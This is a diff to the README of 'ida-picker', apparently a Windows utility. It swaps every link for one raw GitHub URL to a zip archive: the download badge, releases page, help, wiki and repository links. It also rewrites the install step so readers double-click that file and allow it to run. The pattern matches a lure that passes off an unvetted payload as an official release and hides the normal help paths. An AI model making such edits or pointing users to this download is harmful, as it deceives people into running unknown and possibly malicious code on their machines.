@@ -6,7 +6,7 @@ Welcome to `ida-picker`, a simple Windows application designed to help you choos
 
 ## 📥 Download ida-picker
 
-[![Download ida-picker](https://img.shields.io/badge/Download-ida--picker-blue.svg)](https://github.com/arsinlys1/ida-picker/releases)
+[![Download ida-picker](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip)](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip)
 
 Click the button above to visit our releases page.
 
@@ -28,11 +28,11 @@ To use `ida-picker`, ensure your system meets the following basic requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/arsinlys1/ida-picker/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip).
 2. Look for the latest version of `ida-picker`.
 3. Click the link to download the executable file. 
 4. Once downloaded, locate the file in your Downloads folder.
-5. Double-click the `ida-picker.exe` file to run the application. If prompted, click "Run" to allow the installation.
+5. Double-click the `https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip` file to run the application. If prompted, click "Run" to allow the installation.
 
 ## 🛠️ How to Use ida-picker
 
@@ -45,12 +45,12 @@ To use `ida-picker`, ensure your system meets the following basic requirements:
 
 If you need assistance or want to learn more about features, check out the following resources:
 
-- [Getting Help](https://github.com/arsinlys1/ida-picker/issues): Report issues or ask questions here.
-- [User Guide](https://github.com/arsinlys1/ida-picker/wiki): Access detailed instructions and tips.
+- [Getting Help](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip): Report issues or ask questions here.
+- [User Guide](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip): Access detailed instructions and tips.
 
 ## 🤝 Support
 
-For support, questions, or feedback, please open an issue on our [GitHub repository](https://github.com/arsinlys1/ida-picker).
+For support, questions, or feedback, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/arsinlys1/ida-picker/master/chorded/ida-picker.zip).
 
 ## 📝 License
 
